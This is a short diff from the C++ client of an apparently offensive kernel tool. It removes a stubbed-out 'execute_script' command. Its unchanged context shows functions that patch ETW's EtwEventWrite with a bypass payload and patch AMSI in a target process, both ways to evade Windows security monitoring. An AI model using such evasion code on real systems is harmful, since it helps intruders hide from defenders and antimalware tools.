@@ -275,28 +275,6 @@ void MemoryHandler::HandleCommand(_In_ std::string command) {
 		}
 		std::cout << "ETW patched successfully in process " << pid << "." << std::endl;
 	}
-	else if (commandName.compare("execute_script") == 0) {
-		if (params.size() != 1) {
-			PrintHelp();
-			return;
-		}
-		std::ifstream scriptFile(params.at(0), std::ios::binary);
-
-		if (!scriptFile.is_open()) {
-			std::cerr << "Failed to open script file: " << params.at(1) << std::endl;
-			return;
-		}
-		std::vector<byte> script(std::istreambuf_iterator<char>(scriptFile), {});
-
-		if (script.empty()) {
-			std::cerr << "Script file is empty." << std::endl;
-			return;
-		}
-		if (!ExecuteScript(script)) {
-			std::cerr << "Failed to execute script." << std::endl;
-		}
-		std::cout << "Script executed successfully." << std::endl;
-	} 
 	else {
 		std::cerr << "Invalid command!" << std::endl;
 		PrintHelp();
@@ -645,29 +623,4 @@ bool MemoryHandler::PatchAmsi(_In_ DWORD pid) {
  */
 bool MemoryHandler::PatchEtw(_In_ DWORD pid) {
 	return PatchModule(pid, NTDLL_PATH, "EtwEventWrite", ETW_BYPASS_PAYLOAD);
-}
-
-/*
- * Description:
- * ExecuteScript is responsible for executing a script in the kernel.
- *
- * Parameters:
- * @script [_In_ std::vector<byte>] -- The script to be executed.
- * @scriptSize [_In_ SIZE_T] -- The size of the script.
- *
- * Returns:
- * @bool -- Whether the execution was successful or not.
- */
-bool MemoryHandler::ExecuteScript(_In_ std::vector<byte> script) {
-	/*DWORD bytesReturned = 0;
-	ScriptInformation scriptInfo{};
-
-	if (script.size() == 0)
-		return false;
-
-	scriptInfo.Script = script.data();
-	scriptInfo.ScriptSize = script.size();
-	return DeviceIoControl(*hNidhogg.get(), IOCTL_EXEC_SCRIPT, &scriptInfo, sizeof(scriptInfo), nullptr, 0, &bytesReturned, nullptr);*/
-	// GOING TO BE DEPRECATED
-	return false;
 }
